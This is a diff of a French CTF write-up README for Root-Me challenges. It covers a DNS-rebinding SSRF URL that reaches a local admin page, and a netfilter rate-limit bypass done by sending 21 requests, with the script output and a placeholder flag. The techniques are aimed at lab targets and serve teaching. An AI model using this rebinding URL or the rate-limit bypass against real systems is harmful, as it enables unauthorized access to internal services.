@@ -22,7 +22,7 @@ On obtient l'url suivante : `7f000001.08080808.rbndr.us`.
 
 En effectuant une requête sur le site du challenge ou trouve que l'url pour faire une requête est : `http://challenge01.root-me.org:54022/grab?url=7f000001.08080808.rbndr.us:54022/admin`.
 
-Puis [ce script](./Scripts/netfilter.py) va envoyer des requêtes en boucles jusqu'à obtenir le code source de la page admin :
+Puis [ce script](./Scripts/dns.py) va envoyer des requêtes en boucles jusqu'à obtenir le code source de la page admin :
 
 ```bash
 $ python3 netfilter.py           
@@ -34,6 +34,24 @@ b'\n        <html>\n            <head>\n                <title>Admin page</title
 ## II. Netfilter erreurs courantes
 
 🌞 **Write-up de l'épreuve**
+
+On a [ce fichier](./Resources/fw.sh) de configuration.
+
+En le lisant on trouve ces lignes :
+
+```bash
+IP46T -A INPUT-HTTP -m limit --limit 3/sec --limit-burst 20 -j LOG --log-prefix 'FW_FLOODER '
+IP46T -A INPUT-HTTP -m limit --limit 3/sec --limit-burst 20 -j DROP
+```
+
+Dans lequel l'administrateur a mis une limitte de flood à 20 requêtes toutes les 3 secondes.
+
+On utilise donc [ce script](./Scripts/netfilter.py) pour envoyer 21 requêtes à la page d'adminisatrateur et afficher la réponse de la dernière :
+
+```bash
+$ python3 netfilter.py 
+b"\nNicely done:)\n\nThere are probably a few things the administrator was missing when writing this ruleset:\n\n    1) When a rule does not match, the next one is tested against\n\n    2) When jumped in a user defined chain, if there is no match, then the\n       search resumes at the next rule in the previous (calling) chain\n\n    3) The 'limit' match is used to limit the rate at which a given rule can\n       match: above this limit, 1) applies\n\n    4) When a rule with a 'terminating' target (e.g.: ACCEPT, DROP...) matches\n       a packet, then the search stops: the packet won't be tested against any\n       other rules\n    \n\n\n\nThe flag is: [coucou toi le flag est caché]\n\n"
+```
 
 🌞 **Proposer un jeu de règles firewall**
 
